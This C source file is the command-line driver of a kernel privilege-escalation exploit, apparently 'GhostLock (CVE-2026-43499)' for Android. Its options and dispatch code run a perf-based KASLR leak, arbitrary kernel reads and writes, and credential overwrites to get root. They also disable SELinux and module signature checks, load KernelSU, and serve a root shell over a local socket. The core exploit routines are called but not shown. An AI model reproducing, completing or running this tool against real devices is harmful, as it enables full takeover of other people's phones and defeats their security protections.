#include "common.h"

struct ghostlock_opts g_opts;
uint64_t kaslr_base;
uint64_t kaslr_slide;

static void usage(const char *prog) {
  printf("GhostLock (CVE-2026-43499) GOT-W29 write test\n\n");
  printf("Usage: %s [options]\n\n", prog);
  printf("Modes:\n");
  printf("  (default)             perf-based KASLR leak only\n");
  printf("  --verify-write        pointer-value write test (EDEADLK -> carrier\n"
         "                        -> trigger -> boot_id high-half check)\n");
  printf("  --verify-leaf         leaf zero-write test (boot_id low half := 0)\n");
  printf("  --verify-read         read primitive test (redirect the boot_id\n"
         "                        ctl_table .data pointer, read it back)\n");
  printf("  --verify-uuid         UUID-only write/read test; does not touch\n"
         "                        boot_id or /dev/ashmem<boot_id>\n");
  printf("  --verify-safe         consume fake waiter with noop, then with\n"
         "                        leaf/pointer writes confined to BSS\n");
  printf("  --safe-leaf-only      run only the safe leaf shape\n");
  printf("  --safe-pointer-only   run only the safe pointer shape\n");
  printf("  --leak-task           perf-only current task_struct leak (no write)\n");
  printf("  --leak-task-pid N     perf-only remote task_struct leak for TID N\n");
  printf("  --read8 ADDR          read one kernel qword through boot_id\n");
  printf("  --task-percpu         attach the task sampler to runtime_cpu\n");
  printf("  --runtime-cpu N       override the waiter/sampler CPU\n");
  printf("  --task-period NS      CPU-clock period for task sampling (default 100000)\n");
  printf("  --task-iters N        scheduler transitions per task leak (default 20000)\n");
  printf("  --task-rounds N       read-only task leak retries (default 4)\n");
  printf("  --verify-all          write + leaf + read + restore\n\n");
  printf("  --restore-bootid      restore boot_id ctl_table.data after a crash\n\n");
  printf("  --escalate            leak our task (perf __schedule) and point its\n"
         "                        real_cred/cred at init_cred; proves getuid()==0\n\n");
  printf("  --cred-only           point only current->cred at init_cred\n"
         "                        (minimal-write effective root path)\n");
  printf("  --module-prep         clear module signature enforcement and the\n"
         "                        kernel load-data LSM hook\n");
  printf("  --no-cap-bounding     keep the existing capability bounding set\n");
  printf("  --fire-and-forget     do not wait on a write child result pipe\n");
  printf("  --ksu-load            one-shot root, init_module, and ksud late-load\n");
  printf("  --ksu-module PATH     pre-relocated KernelSU module\n");
  printf("  --ksu-manager PATH    manager libksud.so path\n");
  printf("  --ksu-package NAME    manager package name\n");
  printf("  --simple-root         edit our live uid/gid without set*id syscalls\n\n");
  printf("  --sid-probe           root then read the live SELinux numeric SID\n");
  printf("  --kernel-domain       after --simple-root, grant live capabilities\n"
         "                        and the kernel SELinux SID\n\n");
  printf("  --kernel-domain-probe exercise file, sysctl, mount, and exec paths\n\n");
  printf("  --kernel-shell        exec an interactive shell after kernel SID\n\n");
  printf("  --target-domain PID   copy the SELinux security blob from PID\n");
  printf("  --target-domain-comm NAME expected target process comm (vold)\n");
  printf("  --serve-target-domain PID switch the su-server cred to PID's SID\n");
  printf("  --target-task ADDR    use a known task_struct instead of perf scan\n");
  printf("  --target-only         apply --target-domain to the current root cred\n");
  printf("  --target-shell        keep the vold cred alive and exec toybox sh\n\n");
  printf("  --bench N             N independent single-attempt pointer writes,\n"
         "                        report the success rate\n\n");
  printf("  --harden              leaf-zero panic_on_oops only (risk reduction)\n\n");
  printf("  --selinux-relax       clear selinux_state.initialized, disarm the AVC\n"
         "                        threshold, and drain old AVC denials\n\n");
  printf("  --poke-pointer ADDR VALUE\n"
         "                        perform one pointer-shaped write of VALUE at ADDR\n\n");
  printf("  --poke-zero ADDR      perform one aligned zero write at ADDR\n\n");
  printf("  --su-server           escalate, then serve root work on the abstract\n"
         "                        socket @gl_su (mount broker + shell)\n");
  printf("  --serve-only          serve with the current root credential only\n");
  printf("  --su-selftest         escalate + server + client round trip (no shell\n"
         "                        needed: STATUS/GLCAP/GLMOUNT/GLUMOUNT only)\n");
  printf("  --rsh CMD             client side: send CMD (or a GL* directive) to a\n"
         "                        running --su-server and print the reply\n\n");
  printf("  --rsh-shell           attach an interactive root shell to --su-server\n"
         "                        usage: adb shell -t ... --rsh-shell\n\n");
  printf("Options:\n");
  printf("  --kaslr-base ADDR     use ADDR as runtime _stext (skip perf; QEMU/nokaslr)\n");
  printf("  --fake-lock-addr ADDR private zero-filled fake-lock page\n");
  printf("  --fake-lock-empty-zero use empty_zero_page fake-lock slots\n");
  printf("  --fake-lock-window    place fake lock in the MCAST stack window\n");
  printf("  --fake-lock-probed    probe remove_waiter() and place the fake\n"
         "                        lock at waiter-0x20 in the MCAST payload\n");
  printf("  --skip-copy-probe     use --mcast-waiter-off without runtime copy\n"
         "                        address calibration\n");
  printf("  --spin-park           busy-spin after MCAST; blocking syscalls can\n"
         "                        overwrite the fake waiter stack window\n");
  printf("  --select-carrier      shape the waiter through select stack_fds\n");
  printf("  --self-trigger        let the carrier perform its own PI walk\n");
  printf("  --do-futex-waiter-off N waiter offset from sampled do_futex SP (default 0xe0)\n");
  printf("  --mcast-waiter-off N fake waiter offset inside the 0x108-byte MCAST\n"
         "                        option (default 0xb0; must cover tree through lock)\n");
  printf("  --waiter-task-own     use the perf-leaked waiter task in the fake waiter\n");
  printf("  --log-file PATH       persistent log file (default /data/local/tmp/ghostlock.log)\n");
  printf("  --attempts N          max write-test attempts (default 20)\n");
  printf("  --wait-seconds N      FUTEX_WAIT_REQUEUE_PI timeout (default 2)\n");
  printf("  --leak-timeout N      extra seconds allowed for waiter perf leak (default 60)\n");
  printf("  --requeue-ms N        delay before CMP_REQUEUE_PI (default 30)\n");
  printf("  --no-rt               keep the waiter on CFS (default: SCHED_FIFO 99)\n");
  printf("  --rt-prio N           waiter SCHED_FIFO priority (default 99)\n");
  printf("  --probe-cycle         value-based PI cycle (required on kernel.patched/QEMU)\n");
  printf("  --noconsume           encode the payload but skip the trigger walk\n");
  printf("  --no-early-signal     let WAIT_REQUEUE_PI time out instead of waking it\n");
  printf("  --hold                SIGSTOP the child after the attempt (no exit walk)\n");
  printf("  --detach              leave the child paused forever\n");
  printf("  --fsync               fsync the log on final-result lines\n");
  printf("  --shell PATH          shell used by the su server (default /system/bin/sh)\n");
  printf("  --socket-name NAME    abstract broker socket (default gl_su)\n");
  printf("  --tcp-port N          serve/connect the broker on 127.0.0.1:N\n");
  printf("  --serve-count N       stop serving after N requests (0 = unlimited)\n");
  printf("  --slot-file PATH      fake-lock slot ledger (default /data/local/tmp/gl.slot;\n"
         "                        \"\" disables the cross-process accounting)\n");
  printf("  -h, --help            this help\n");
}

static const char *opt_value(int argc, char **argv, int *i) {
  if (*i + 1 >= argc) {
    fprintf(stderr, "missing value for %s\n", argv[*i]);
    return NULL;
  }
  return argv[++(*i)];
}

static int parse_int(const char *s, int *out) {
  char *end = NULL;
  errno = 0;
  long v = strtol(s, &end, 0);
  if (errno || end == s || *end || v < -2147483648L || v > 2147483647L) {
    return 0;
  }
  *out = (int)v;
  return 1;
}

static int parse_u64(const char *s, uint64_t *out) {
  char *end = NULL;
  errno = 0;
  unsigned long long v = strtoull(s, &end, 0);
  if (errno || end == s || *end) {
    return 0;
  }
  *out = (uint64_t)v;
  return 1;
}

int run_exploit(int argc, char **argv) {
  /* defaults */
  g_opts.kaslr_base = 0;
  g_opts.fake_lock_addr = 0;
  g_opts.fake_lock_empty_zero = 0;
  g_opts.do_futex_waiter_off = 0xe0;
  g_opts.mcast_waiter_off = MCAST_WAITER_OFF_DEFAULT;
  g_opts.log_file = "/data/local/tmp/ghostlock.log";
  g_opts.attempts = 20;
  g_opts.wait_seconds = 2;
  g_opts.leak_timeout_seconds = 60;
  g_opts.requeue_ms = 30;
  g_opts.rt_prio = 99;
  g_opts.probe_cycle = 0;
  g_opts.fake_lock_window = 0;
  g_opts.fake_lock_probed = 0;
  g_opts.skip_copy_probe = 0;
  g_opts.spin_park = 0;
  g_opts.select_carrier = 0;
  g_opts.self_trigger = 0;
  g_opts.waiter_task_own = 0;
  g_opts.noconsume = 0;
  g_opts.no_early_signal = 0;
  g_opts.hold = 0;
  g_opts.detach = 0;
  g_opts.fsync = 0;
  g_opts.verify_write = 0;
  g_opts.verify_leaf = 0;
  g_opts.verify_read = 0;
  g_opts.verify_uuid = 0;
  g_opts.verify_safe = 0;
  g_opts.safe_leaf_only = 0;
  g_opts.safe_pointer_only = 0;
  g_opts.leak_task = 0;
  g_opts.leak_task_pid = 0;
  g_opts.read8 = 0;
  g_opts.read8_target = 0;
  g_opts.task_percpu = 0;
  g_opts.runtime_cpu_override = -1;
  g_opts.task_sample_period = 100000;
  g_opts.task_trigger_iters = 20000;
  g_opts.task_rounds = 4;
  g_opts.verify_all = 0;
  g_opts.restore_bootid = 0;
  g_opts.escalate = 0;
  g_opts.simple_root = 0;
  g_opts.sid_probe = 0;
  g_opts.kernel_domain = 0;
  g_opts.kernel_domain_probe = 0;
  g_opts.target_shell = 0;
  g_opts.target_only = 0;
  g_opts.serve_target_domain_pid = 0;
  g_opts.bench = 0;
  g_opts.harden = 0;
  g_opts.selinux_relax = 0;
  g_opts.poke_pointer = 0;
  g_opts.poke_target = 0;
  g_opts.poke_value = 0;
  g_opts.poke_zero = 0;
  g_opts.su_server = 0;
  g_opts.serve_only = 0;
  g_opts.su_selftest = 0;
  g_opts.serve_count = 0;
  g_opts.rsh_cmd = NULL;
  g_opts.rsh_shell = 0;
  g_opts.shell_path = NULL;
  g_opts.slot_file = NULL;

  for (int i = 1; i < argc; i++) {
    const char *a = argv[i];
    const char *v = NULL;
    if (!strcmp(a, "-h") || !strcmp(a, "--help")) {
      usage(argv[0]);
      return 0;
    } else if (!strcmp(a, "--kaslr-base")) {
      if (!(v = opt_value(argc, argv, &i)) || !parse_u64(v, &g_opts.kaslr_base)) {
        fprintf(stderr, "invalid --kaslr-base value\n");
        return 2;
      }
    } else if (!strcmp(a, "--fake-lock-addr")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.fake_lock_addr) ||
          (g_opts.fake_lock_addr & 0x1f)) {
        fprintf(stderr, "invalid --fake-lock-addr value (must be 32-byte aligned)\n");
        return 2;
      }
    } else if (!strcmp(a, "--fake-lock-empty-zero")) {
      g_opts.fake_lock_empty_zero = 1;
    } else if (!strcmp(a, "--fake-lock-window")) {
      g_opts.fake_lock_window = 1;
    } else if (!strcmp(a, "--fake-lock-probed")) {
      g_opts.fake_lock_probed = 1;
    } else if (!strcmp(a, "--skip-copy-probe")) {
      g_opts.skip_copy_probe = 1;
    } else if (!strcmp(a, "--spin-park")) {
      g_opts.spin_park = 1;
    } else if (!strcmp(a, "--select-carrier")) {
      g_opts.select_carrier = 1;
    } else if (!strcmp(a, "--self-trigger")) {
      g_opts.self_trigger = 1;
    } else if (!strcmp(a, "--do-futex-waiter-off")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.do_futex_waiter_off) ||
          (g_opts.do_futex_waiter_off & 0x7)) {
        fprintf(stderr, "invalid --do-futex-waiter-off value (must be 8-byte aligned)\n");
        return 2;
      }
    } else if (!strcmp(a, "--mcast-waiter-off")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.mcast_waiter_off) ||
          (g_opts.mcast_waiter_off & 0x7) ||
          g_opts.mcast_waiter_off + WAITER_LOCK_OFF + 8 > MCAST_OPT_LEN) {
        fprintf(stderr,
                "invalid --mcast-waiter-off value "
                "(8-byte aligned, copy must reach waiter->lock)\n");
        return 2;
      }
    } else if (!strcmp(a, "--waiter-task-own")) {
      g_opts.waiter_task_own = 1;
    } else if (!strcmp(a, "--log-file")) {
      if (!(v = opt_value(argc, argv, &i))) {
        return 2;
      }
      g_opts.log_file = v;
    } else if (!strcmp(a, "--attempts")) {
      if (!(v = opt_value(argc, argv, &i)) || !parse_int(v, &g_opts.attempts) ||
          g_opts.attempts < 1) {
        fprintf(stderr, "invalid --attempts value\n");
        return 2;
      }
    } else if (!strcmp(a, "--wait-seconds")) {
      if (!(v = opt_value(argc, argv, &i)) || !parse_int(v, &g_opts.wait_seconds) ||
          g_opts.wait_seconds < 1) {
        fprintf(stderr, "invalid --wait-seconds value\n");
        return 2;
      }
    } else if (!strcmp(a, "--leak-timeout")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.leak_timeout_seconds) ||
          g_opts.leak_timeout_seconds < 0) {
        fprintf(stderr, "invalid --leak-timeout value\n");
        return 2;
      }
    } else if (!strcmp(a, "--requeue-ms")) {
      if (!(v = opt_value(argc, argv, &i)) || !parse_int(v, &g_opts.requeue_ms) ||
          g_opts.requeue_ms < 0) {
        fprintf(stderr, "invalid --requeue-ms value\n");
        return 2;
      }
    } else if (!strcmp(a, "--no-rt")) {
      g_opts.rt_prio = 0;
    } else if (!strcmp(a, "--rt-prio")) {
      if (!(v = opt_value(argc, argv, &i)) || !parse_int(v, &g_opts.rt_prio) ||
          g_opts.rt_prio < 1 || g_opts.rt_prio > 99) {
        fprintf(stderr, "invalid --rt-prio value (1..99)\n");
        return 2;
      }
    } else if (!strcmp(a, "--probe-cycle")) {
      g_opts.probe_cycle = 1;
    } else if (!strcmp(a, "--noconsume")) {
      g_opts.noconsume = 1;
    } else if (!strcmp(a, "--no-early-signal")) {
      g_opts.no_early_signal = 1;
    } else if (!strcmp(a, "--hold")) {
      g_opts.hold = 1;
    } else if (!strcmp(a, "--detach")) {
      g_opts.detach = 1;
    } else if (!strcmp(a, "--fsync")) {
      g_opts.fsync = 1;
    } else if (!strcmp(a, "--verify-write")) {
      g_opts.verify_write = 1;
    } else if (!strcmp(a, "--verify-leaf")) {
      g_opts.verify_leaf = 1;
    } else if (!strcmp(a, "--verify-read")) {
      g_opts.verify_read = 1;
    } else if (!strcmp(a, "--verify-uuid")) {
      g_opts.verify_uuid = 1;
    } else if (!strcmp(a, "--verify-safe")) {
      g_opts.verify_safe = 1;
    } else if (!strcmp(a, "--safe-leaf-only")) {
      g_opts.safe_leaf_only = 1;
    } else if (!strcmp(a, "--safe-pointer-only")) {
      g_opts.safe_pointer_only = 1;
    } else if (!strcmp(a, "--leak-task")) {
      g_opts.leak_task = 1;
    } else if (!strcmp(a, "--leak-task-pid")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.leak_task_pid) ||
          g_opts.leak_task_pid < 1) {
        fprintf(stderr, "invalid --leak-task-pid value\n");
        return 2;
      }
    } else if (!strcmp(a, "--read8")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.read8_target)) {
        fprintf(stderr, "invalid --read8 address\n");
        return 2;
      }
      g_opts.read8 = 1;
    } else if (!strcmp(a, "--task-percpu")) {
      g_opts.task_percpu = 1;
    } else if (!strcmp(a, "--runtime-cpu")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.runtime_cpu_override) ||
          g_opts.runtime_cpu_override < 0) {
        fprintf(stderr, "invalid --runtime-cpu value\n");
        return 2;
      }
    } else if (!strcmp(a, "--task-period")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.task_sample_period) ||
          g_opts.task_sample_period < 1) {
        fprintf(stderr, "invalid --task-period value\n");
        return 2;
      }
    } else if (!strcmp(a, "--task-iters")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.task_trigger_iters) ||
          g_opts.task_trigger_iters < 1) {
        fprintf(stderr, "invalid --task-iters value\n");
        return 2;
      }
    } else if (!strcmp(a, "--task-rounds")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.task_rounds) || g_opts.task_rounds < 1) {
        fprintf(stderr, "invalid --task-rounds value\n");
        return 2;
      }
    } else if (!strcmp(a, "--verify-all")) {
      g_opts.verify_all = 1;
    } else if (!strcmp(a, "--restore-bootid")) {
      g_opts.restore_bootid = 1;
    } else if (!strcmp(a, "--escalate")) {
      g_opts.escalate = 1;
    } else if (!strcmp(a, "--cred-only")) {
      g_opts.cred_only = 1;
    } else if (!strcmp(a, "--module-prep")) {
      g_opts.module_prep = 1;
    } else if (!strcmp(a, "--no-cap-bounding")) {
      g_opts.no_cap_bounding = 1;
    } else if (!strcmp(a, "--fire-and-forget")) {
      g_opts.fire_and_forget = 1;
    } else if (!strcmp(a, "--ksu-load")) {
      g_opts.ksu_load = 1;
    } else if (!strcmp(a, "--ksu-module")) {
      g_opts.ksu_module = opt_value(argc, argv, &i);
    } else if (!strcmp(a, "--ksu-manager")) {
      g_opts.ksu_manager = opt_value(argc, argv, &i);
    } else if (!strcmp(a, "--ksu-package")) {
      g_opts.ksu_package = opt_value(argc, argv, &i);
    } else if (!strcmp(a, "--simple-root")) {
      g_opts.simple_root = 1;
    } else if (!strcmp(a, "--sid-probe")) {
      g_opts.sid_probe = 1;
    } else if (!strcmp(a, "--kernel-domain")) {
      g_opts.kernel_domain = 1;
    } else if (!strcmp(a, "--kernel-domain-probe")) {
      g_opts.kernel_domain_probe = 1;
    } else if (!strcmp(a, "--kernel-shell")) {
      g_opts.kernel_shell = 1;
    } else if (!strcmp(a, "--target-domain")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.target_domain_pid) ||
          g_opts.target_domain_pid < 1) {
        fprintf(stderr, "invalid --target-domain value\n");
        return 2;
      }
    } else if (!strcmp(a, "--target-domain-comm")) {
      if (!(v = opt_value(argc, argv, &i))) {
        return 2;
      }
      g_opts.target_domain_comm = v;
    } else if (!strcmp(a, "--serve-target-domain")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.serve_target_domain_pid) ||
          g_opts.serve_target_domain_pid < 1) {
        fprintf(stderr, "invalid --serve-target-domain value\n");
        return 2;
      }
    } else if (!strcmp(a, "--target-task")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.target_task_addr) ||
          !g_opts.target_task_addr) {
        fprintf(stderr, "invalid --target-task value\n");
        return 2;
      }
    } else if (!strcmp(a, "--target-shell")) {
      g_opts.target_shell = 1;
    } else if (!strcmp(a, "--target-only")) {
      g_opts.target_only = 1;
    } else if (!strcmp(a, "--bench")) {
      if (!(v = opt_value(argc, argv, &i)) || !parse_int(v, &g_opts.bench) ||
          g_opts.bench < 1) {
        fprintf(stderr, "invalid --bench value\n");
        return 2;
      }
    } else if (!strcmp(a, "--harden")) {
      g_opts.harden = 1;
    } else if (!strcmp(a, "--selinux-relax")) {
      g_opts.selinux_relax = 1;
    } else if (!strcmp(a, "--poke-pointer")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.poke_target)) {
        fprintf(stderr, "invalid --poke-pointer target\n");
        return 2;
      }
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.poke_value)) {
        fprintf(stderr, "invalid --poke-pointer value\n");
        return 2;
      }
      g_opts.poke_pointer = 1;
    } else if (!strcmp(a, "--poke-zero")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_u64(v, &g_opts.poke_target)) {
        fprintf(stderr, "invalid --poke-zero target\n");
        return 2;
      }
      g_opts.poke_zero = 1;
    } else if (!strcmp(a, "--su-server")) {
      g_opts.su_server = 1;
    } else if (!strcmp(a, "--serve-only")) {
      g_opts.serve_only = 1;
      g_opts.su_server = 1;
    } else if (!strcmp(a, "--su-selftest")) {
      g_opts.su_selftest = 1;
    } else if (!strcmp(a, "--serve-count")) {
      if (!(v = opt_value(argc, argv, &i)) ||
          !parse_int(v, &g_opts.serve_count) || g_opts.serve_count < 0) {
        fprintf(stderr, "invalid --serve-count value\n");
        return 2;
      }
    } else if (!strcmp(a, "--rsh")) {
      if (!(v = opt_value(argc, argv, &i))) {
        return 2;
      }
      g_opts.rsh_cmd = v;
    } else if (!strcmp(a, "--rsh-shell")) {
      g_opts.rsh_shell = 1;
    } else if (!strcmp(a, "--shell")) {
      if (!(v = opt_value(argc, argv, &i))) {
        return 2;
      }
      g_opts.shell_path = v;
    } else if (!strcmp(a, "--socket-name")) {
      if (!(v = opt_value(argc, argv, &i))) {
        return 2;
      }
      g_opts.socket_name = v;
    } else if (!strcmp(a, "--tcp-port")) {
      if (!(v = opt_value(argc, argv, &i)) || !parse_int(v, &g_opts.tcp_port) ||
          g_opts.tcp_port < 1 || g_opts.tcp_port > 65535) {
        fprintf(stderr, "invalid --tcp-port value\n");
        return 2;
      }
    } else if (!strcmp(a, "--slot-file")) {
      if (!(v = opt_value(argc, argv, &i))) {
        return 2;
      }
      g_opts.slot_file = v;
    } else {
      fprintf(stderr, "unknown option: %s\n", a);
      usage(argv[0]);
      return 2;
    }
  }

  ghostlock_log_init(g_opts.log_file, g_opts.fsync);
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  /* Client modes do not need the kernel base.  Dispatch before perf so an
   * interactive shell connects immediately instead of waiting for KASLR. */
  if (g_opts.rsh_shell) {
    return su_run_shell_client() ? 0 : 2;
  }
  if (g_opts.rsh_cmd) {
    return su_run_client(g_opts.rsh_cmd) ? 0 : 2;
  }

  if (!init_runtime_cpu()) {
    pr_error("runtime performance CPU detection failed errno=%d\n", errno);
  }
  if (g_opts.runtime_cpu_override >= 0 &&
      g_opts.runtime_cpu_override != runtime_cpu) {
    runtime_cpu = g_opts.runtime_cpu_override;
    pr_success("runtime cpu override=%d\n", runtime_cpu);
  }
  log_startup_context();
  pin_to_core(CORE);

  /* KASLR first (perf_event_open works from an untrusted shell).  --kaslr-base
     overrides it for QEMU/research (TCG does not sample; nokaslr ->
     KIMAGE_STEXT_LINK). */
  uint64_t stext = g_opts.kaslr_base;
  if (!stext) {
    for (int p = 0; p < 5 && !stext; p++) {
      stext = perf_leak_stext();
    }
  }
  if (!stext) {
    pr_error("perf KASLR leak failed\n");
  }
  kaslr_base = stext;
  /* perf returns the runtime _stext (= _text + 0x800 + slide).  The slide must
     be anchored on _stext: subtracting KIMAGE_TEXT_BASE would leave the 0x800
     behind and shift every kimage target (boot_id, fake_lock, ...). */
  kaslr_slide = kaslr_base - KIMAGE_STEXT_LINK;
  pr_success("perf-kaslr base=%016llx slide=%016llx\n",
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);

  int ok;
  if (g_opts.ksu_load) {
    ok = su_run_ksu_load();
  } else if (g_opts.su_selftest) {
    ok = su_run_selftest();
  } else if (g_opts.su_server) {
    ok = su_run_server();
  } else if (g_opts.selinux_relax) {
    ok = slide_run_selinux_relax();
  } else if (g_opts.poke_pointer) {
    ok = slide_run_poke_pointer(g_opts.poke_target, g_opts.poke_value);
  } else if (g_opts.poke_zero) {
    ok = slide_run_poke_zero(g_opts.poke_target);
  } else if (g_opts.target_only) {
    ok = slide_run_target_only(g_opts.target_domain_pid,
                               g_opts.target_domain_comm,
                               g_opts.target_task_addr);
  } else if (g_opts.leak_task) {
    ok = slide_run_leak_task();
  } else if (g_opts.leak_task_pid) {
    ok = slide_run_leak_task_pid(g_opts.leak_task_pid);
  } else if (g_opts.read8) {
    ok = slide_run_read8(g_opts.read8_target);
  } else if (g_opts.bench) {
    ok = slide_run_bench(g_opts.bench);
  } else if (g_opts.harden) {
    ok = slide_run_harden();
  } else if (g_opts.module_prep) {
    ok = slide_run_module_prep();
  } else if (g_opts.simple_root) {
    ok = slide_run_simple_root();
  } else if (g_opts.sid_probe) {
    ok = slide_run_current_sid_probe();
  } else if (g_opts.cred_only) {
    ok = slide_run_cred_only();
  } else if (g_opts.escalate) {
    ok = slide_run_escalate();
  } else if (g_opts.verify_all) {
    ok = slide_run_verify_all();
  } else if (g_opts.restore_bootid) {
    ok = slide_run_restore_bootid();
  } else if (g_opts.verify_leaf) {
    ok = slide_run_leaf_test();
  } else if (g_opts.verify_read) {
    ok = slide_run_read_test();
  } else if (g_opts.verify_uuid) {
    ok = slide_run_uuid_test();
  } else if (g_opts.verify_safe) {
    ok = slide_run_safe_test();
  } else if (g_opts.verify_write) {
    ok = slide_run_write_test();
  } else {
    pr_info("KASLR OK; stopping (--verify-write/--verify-all to run tests)\n");
    return 0;
  }
  return ok ? 0 : 2;
}
